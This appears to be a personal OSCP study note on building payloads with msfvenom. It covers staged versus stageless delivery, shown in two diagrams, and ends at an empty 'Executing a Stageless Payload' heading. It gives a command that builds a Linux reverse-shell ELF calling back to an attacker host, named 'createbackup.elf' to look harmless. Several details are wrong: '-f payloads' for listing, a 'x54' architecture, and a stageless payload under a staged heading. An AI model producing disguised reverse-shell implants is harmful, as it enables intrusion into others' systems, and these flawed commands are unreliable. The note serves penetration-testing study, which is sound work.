---
permalink: oscp/techniques/shells-and-payloads/crafting-payloads-with-msfvenom
title: Crafting Payloads with MSFvenom
type: note
---

## Practicing

### List Payloads
```bash
msfvenom -f payloads
```
- Always lists OS targets

---

## Staged vs Stageless Payloads

### Staged
![700](data:image/svg+xml;charset=utf-8,%3Csvg%20font-family%3D%22-apple-system-body%2C%20ui-sans-serif%2C%20-apple-system%2C%20system-ui%2C%20%26quot%3BSegoe%20UI%26quot%3B%2C%20Helvetica%2C%20%26quot%3BApple%20Color%20Emoji%26quot%3B%2C%20Arial%2C%20sans-serif%2C%20%26quot%3BSegoe%20UI%20Emoji%26quot%3B%2C%20%26quot%3BSegoe%20UI%20Symbol%26quot%3B%22%20font-weight%3D%22400%22%20data-d-component%3D%22svg%22%20fill%3D%22currentColor%22%20style%3D%22color%3Argb\(237%2C%20237%2C%20237\)%22%20viewBox%3D%220%200%20340%20174%22%20width%3D%22100%25%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Crect%20x%3D%2212%22%20y%3D%2238%22%20width%3D%22100%22%20height%3D%2270%22%20rx%3D%229%22%20fill%3D%22%2364748b%22%20fill-opacity%3D%22.13%22%20stroke%3D%22%2364748b%22%20stroke-opacity%3D%22.55%22%2F%3E%3Crect%20x%3D%2242%22%20y%3D%2250%22%20width%3D%2240%22%20height%3D%2230%22%20rx%3D%223%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%20fill%3D%22none%22%2F%3E%3Cpath%20d%3D%22M62%2080v6m-13%200h26%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%2F%3E%3Ctext%20x%3D%2262%22%20y%3D%22100%22%20font-size%3D%2212%22%20text-anchor%3D%22middle%22%20fill%3D%22currentColor%22%3EAttacker%3C%2Ftext%3E%3Crect%20x%3D%22228%22%20y%3D%2238%22%20width%3D%22100%22%20height%3D%2270%22%20rx%3D%229%22%20fill%3D%22%2364748b%22%20fill-opacity%3D%22.13%22%20stroke%3D%22%2364748b%22%20stroke-opacity%3D%22.55%22%2F%3E%3Crect%20x%3D%22258%22%20y%3D%2250%22%20width%3D%2240%22%20height%3D%2230%22%20rx%3D%223%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%20fill%3D%22none%22%2F%3E%3Cpath%20d%3D%22M278%2080v6m-13%200h26%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%2F%3E%3Ctext%20x%3D%22278%22%20y%3D%22100%22%20font-size%3D%2212%22%20text-anchor%3D%22middle%22%20fill%3D%22currentColor%22%3ETarget%3C%2Ftext%3E%3Cpath%20d%3D%22M113%2050H222%22%20stroke%3D%22%2316a34a%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%2F%3E%3Cpath%20d%3D%22M215%2045l7%205-7%205%22%20fill%3D%22none%22%20stroke%3D%22%2316a34a%22%20stroke-width%3D%222%22%2F%3E%3Ctext%20x%3D%22167%22%20y%3D%2242%22%20text-anchor%3D%22middle%22%20font-size%3D%2210%22%20fill%3D%22%2316a34a%22%3E1.%20Small%20stager%3C%2Ftext%3E%3Cpath%20d%3D%22M227%2080H117%22%20stroke%3D%22%23d97706%22%20stroke-width%3D%222%22%20stroke-dasharray%3D%225%204%22%2F%3E%3Cpath%20d%3D%22M124%2075l-7%205%207%205%22%20stroke%3D%22%23d97706%22%20stroke-width%3D%222%22%20fill%3D%22none%22%2F%3E%3Ctext%20x%3D%22170%22%20y%3D%2272%22%20text-anchor%3D%22middle%22%20font-size%3D%2210%22%20fill%3D%22%23d97706%22%3E2.%20Callback%3C%2Ftext%3E%3Cpath%20d%3D%22M113%20116H222%22%20stroke%3D%22%232563eb%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%2F%3E%3Cpath%20d%3D%22M215%20111l7%205-7%205%22%20fill%3D%22none%22%20stroke%3D%22%232563eb%22%20stroke-width%3D%222%22%2F%3E%3Ctext%20x%3D%22169%22%20y%3D%22132%22%20text-anchor%3D%22middle%22%20font-size%3D%2210%22%20fill%3D%22%232563eb%22%3E3.%20Full%20payload%3C%2Ftext%3E%3Ctext%20x%3D%22170%22%20y%3D%22159%22%20text-anchor%3D%22middle%22%20font-size%3D%2211%22%20fill%3D%22currentColor%22%3ETarget%20executes%20the%20full%20payload%3C%2Ftext%3E%3C%2Fsvg%3E)
- Small Payloads gets sent to target first
- The target connects back to the attacker machine
- The attacker machine then sends the larger payload

### Stageless
![700](data:image/svg+xml;charset=utf-8,%3Csvg%20font-family%3D%22-apple-system-body%2C%20ui-sans-serif%2C%20-apple-system%2C%20system-ui%2C%20%26quot%3BSegoe%20UI%26quot%3B%2C%20Helvetica%2C%20%26quot%3BApple%20Color%20Emoji%26quot%3B%2C%20Arial%2C%20sans-serif%2C%20%26quot%3BSegoe%20UI%20Emoji%26quot%3B%2C%20%26quot%3BSegoe%20UI%20Symbol%26quot%3B%22%20font-weight%3D%22400%22%20data-d-component%3D%22svg%22%20fill%3D%22currentColor%22%20style%3D%22color%3Argb\(237%2C%20237%2C%20237\)%22%20viewBox%3D%220%200%20340%20132%22%20width%3D%22100%25%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Crect%20x%3D%2212%22%20y%3D%2225%22%20width%3D%22100%22%20height%3D%2270%22%20rx%3D%229%22%20fill%3D%22%2364748b%22%20fill-opacity%3D%22.13%22%20stroke%3D%22%2364748b%22%20stroke-opacity%3D%22.55%22%2F%3E%3Crect%20x%3D%2242%22%20y%3D%2237%22%20width%3D%2240%22%20height%3D%2230%22%20rx%3D%223%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%20fill%3D%22none%22%2F%3E%3Cpath%20d%3D%22M62%2067v6m-13%200h26%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%2F%3E%3Ctext%20x%3D%2262%22%20y%3D%2287%22%20font-size%3D%2212%22%20text-anchor%3D%22middle%22%20fill%3D%22currentColor%22%3EAttacker%3C%2Ftext%3E%3Crect%20x%3D%22228%22%20y%3D%2225%22%20width%3D%22100%22%20height%3D%2270%22%20rx%3D%229%22%20fill%3D%22%2364748b%22%20fill-opacity%3D%22.13%22%20stroke%3D%22%2364748b%22%20stroke-opacity%3D%22.55%22%2F%3E%3Crect%20x%3D%22258%22%20y%3D%2237%22%20width%3D%2240%22%20height%3D%2230%22%20rx%3D%223%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%20fill%3D%22none%22%2F%3E%3Cpath%20d%3D%22M278%2067v6m-13%200h26%22%20stroke%3D%22currentColor%22%20stroke-width%3D%221.7%22%2F%3E%3Ctext%20x%3D%22278%22%20y%3D%2287%22%20font-size%3D%2212%22%20text-anchor%3D%22middle%22%20fill%3D%22currentColor%22%3ETarget%3C%2Ftext%3E%3Cpath%20d%3D%22M113%2045H222%22%20stroke%3D%22%2316a34a%22%20stroke-width%3D%223%22%20stroke-linecap%3D%22round%22%2F%3E%3Cpath%20d%3D%22M214%2039l8%206-8%206%22%20fill%3D%22none%22%20stroke%3D%22%2316a34a%22%20stroke-width%3D%222%22%2F%3E%3Ctext%20x%3D%22168%22%20y%3D%2235%22%20text-anchor%3D%22middle%22%20font-size%3D%2210%22%20fill%3D%22%2316a34a%22%3EFull%20payload%3C%2Ftext%3E%3Cpath%20d%3D%22M227%2079H117%22%20stroke%3D%22%232563eb%22%20stroke-width%3D%222%22%20stroke-dasharray%3D%225%204%22%2F%3E%3Cpath%20d%3D%22M124%2074l-7%205%207%205%22%20stroke%3D%22%232563eb%22%20stroke-width%3D%222%22%20fill%3D%22none%22%2F%3E%3Ctext%20x%3D%22170%22%20y%3D%2270%22%20text-anchor%3D%22middle%22%20font-size%3D%2210%22%20fill%3D%22%232563eb%22%3EReverse%20connection%3C%2Ftext%3E%3Ctext%20x%3D%22170%22%20y%3D%22119%22%20text-anchor%3D%22middle%22%20font-size%3D%2211%22%20fill%3D%22currentColor%22%3ENo%20second%20payload%20download%20needed%3C%2Ftext%3E%3C%2Fsvg%3E)
- Attacker exploits vulnerability with the entire payload being executed
- The target executes the payload and a reverse shell connects back to your machine 

---

## Building a Staged Payload

### Building it
```bash
msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createbackup.elf
```
- `-f elf` is the format of the generated binary we will be in

---
## Executing a Stageless Payload
